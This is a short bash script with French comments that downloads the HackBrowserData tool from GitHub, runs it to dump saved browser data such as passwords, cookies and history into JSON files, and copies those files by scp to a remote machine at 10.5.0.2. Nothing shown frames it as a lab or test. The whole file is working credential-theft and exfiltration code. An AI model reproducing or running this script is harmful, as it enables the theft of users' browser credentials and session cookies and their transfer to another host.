#!/bin/bash

# Variables
SERVER_USER="DELL"
SERVER_IP="10.5.0.2"  # Remplace par l'IP du premier PC
DEST_DIR="/home/$SERVER_USER/hackbrowserdata"

# Vérifier que SSH fonctionne avant de commencer
echo "[+] Test de connexion SSH..."
ssh -o BatchMode=yes -o ConnectTimeout=5 $SERVER_USER@$SERVER_IP "echo SSH OK" 2>/dev/null
if [ $? -ne 0 ]; then
    echo "[!] Erreur : Impossible de se connecter à $SERVER_IP en SSH. Vérifie ton serveur SSH."
    exit 1
fi

# Télécharger HackBrowserData
echo "[+] Téléchargement de HackBrowserData..."
wget -q --show-progress https://github.com/moonD4rk/HackBrowserData/releases/latest/download/hackbrowserdata_linux_amd64.tar.gz
tar -xzf hackbrowserdata_linux_amd64.tar.gz
chmod +x hackbrowserdata

# Exécuter HackBrowserData
echo "[+] Extraction des données..."
./hackbrowserdata -o json

# Vérifier si des fichiers JSON ont été créés
if ls *.json 1> /dev/null 2>&1; then
    echo "[+] Envoi des fichiers au premier PC..."
    scp -r *.json $SERVER_USER@$SERVER_IP:$DEST_DIR
    echo "[+] Terminé ! Les fichiers sont sur $SERVER_IP:$DEST_DIR"
else
    echo "[!] Erreur : Aucun fichier JSON trouvé. HackBrowserData a peut-être échoué."
    exit 1
fi
